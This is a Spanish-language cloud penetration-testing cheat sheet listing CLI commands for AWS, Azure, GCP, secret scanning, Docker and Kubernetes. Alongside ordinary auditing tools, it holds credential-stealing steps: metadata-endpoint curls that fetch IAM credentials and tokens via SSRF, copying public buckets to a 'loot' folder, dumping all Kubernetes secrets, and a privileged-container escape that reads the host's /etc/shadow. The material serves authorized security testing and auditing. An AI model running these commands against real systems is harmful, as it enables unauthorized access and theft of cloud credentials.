# Cloud Security -- Cheat Sheet

---

## AWS

```bash
# Configuracion
aws configure
aws sts get-caller-identity

# IAM
aws iam list-users
aws iam list-roles
aws iam list-attached-user-policies --user-name USER
aws iam get-policy-version --policy-arn ARN --version-id v1

# S3
aws s3 ls
aws s3 ls s3://BUCKET --no-sign-request  # sin credenciales
aws s3 sync s3://BUCKET . --no-sign-request
aws s3api get-bucket-acl --bucket BUCKET
aws s3api get-bucket-policy --bucket BUCKET

# EC2
aws ec2 describe-instances
aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values=0.0.0.0/0

# Metadata (desde instancia o SSRF)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Secretos
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id NOMBRE
aws ssm get-parameters-by-path --path / --recursive --with-decryption

# Lambda
aws lambda list-functions
aws lambda get-function-configuration --function-name NOMBRE

# Auditoria automatica
scout aws
prowler -g group1
pacu
```

---

## Azure

```bash
# Login
az login
az account show

# Enumeracion
az ad user list
az resource list
az storage account list
az keyvault list

# Storage
az storage container list --account-name CUENTA
az storage blob list --container-name CONTAINER --account-name CUENTA

# Key Vault
az keyvault secret list --vault-name VAULT
az keyvault secret show --vault-name VAULT --name SECRET

# Metadata (desde VM)
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

---

## GCP

```bash
# Login
gcloud auth login
gcloud config set project PROJECT_ID

# Enumeracion
gcloud compute instances list
gcloud storage buckets list
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT_ID

# GCS Buckets
gsutil ls gs://BUCKET
gsutil iam get gs://BUCKET
gsutil -m cp -r gs://BUCKET ./loot

# Metadata (desde instancia o SSRF)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

---

## Busqueda de secretos

```bash
# trufflehog
trufflehog github --repo URL --only-verified
trufflehog github --org ORGANIZACION

# GitLeaks
gitleaks detect --source . --log-opts="--all"

# AWS credenciales
aws sts get-caller-identity  # verificar si funcionan

# enumerate-iam
python3 enumerate-iam.py --access-key AKID --secret-key SECRET
```

---

## Docker / Kubernetes

```bash
# Docker API expuesta
curl http://IP:2375/containers/json

# Escape de contenedor (si --privileged)
fdisk -l && mount /dev/sda1 /mnt && cat /mnt/etc/shadow

# Kubernetes secretos
kubectl get secrets --all-namespaces -o yaml

# Trivy -- scan de vulnerabilidades
trivy image IMAGEN:latest --severity HIGH,CRITICAL

# ScoutSuite
scout aws
scout azure --cli
scout gcp --user-account
```
